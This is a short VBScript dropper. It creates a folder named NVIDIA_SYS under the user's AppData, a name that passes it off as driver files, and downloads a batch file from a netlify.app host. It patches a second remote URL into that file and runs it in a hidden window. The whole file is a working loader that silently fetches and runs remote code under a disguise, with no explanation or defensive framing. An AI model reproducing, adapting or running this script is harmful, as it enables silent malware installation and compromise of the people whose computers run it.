Set fso = CreateObject("Scripting.FileSystemObject")
folder = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%APPDATA%\NVIDIA_SYS")

If fso.FolderExists(folder) Then
    fso.DeleteFolder folder, True
End If

Set fso = CreateObject("Scripting.FileSystemObject")
Set sh = CreateObject("WScript.Shell")
Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")

' Set and create directories
p = sh.ExpandEnvironmentStrings("%AppData%") & "\NVIDIA_SYS"
If Not fso.FolderExists(p) Then fso.CreateFolder p

p = p & "\LOGS"
If Not fso.FolderExists(p) Then fso.CreateFolder p

' Download the batch file
http.Open "GET", "https://n-new-server.netlify.app/files/C-F/final.bat", False
http.Send

If http.Status = 200 Then
    ' Save response as a file
    Set s = CreateObject("ADODB.Stream")
    s.Type = 1 ' binary
    s.Open
    s.Write http.responseBody
    s.SaveToFile p & "\NVM_UP.BAT", 2
    s.Close

    ' Modify the file content
    Set t = fso.OpenTextFile(p & "\NVM_UP.BAT", 1)
    d = t.ReadAll
    t.Close

    d = Replace(d, "****", "'https://gleaming-youtiao-b2b188.netlify.app/files/output.txt'")

    Set t = fso.OpenTextFile(p & "\NVM_UP.BAT", 2, True)
    t.Write d
    t.Close

    ' Run the batch file
    sh.Run Chr(34) & p & "\NVM_UP.BAT" & Chr(34), 0, False
End If
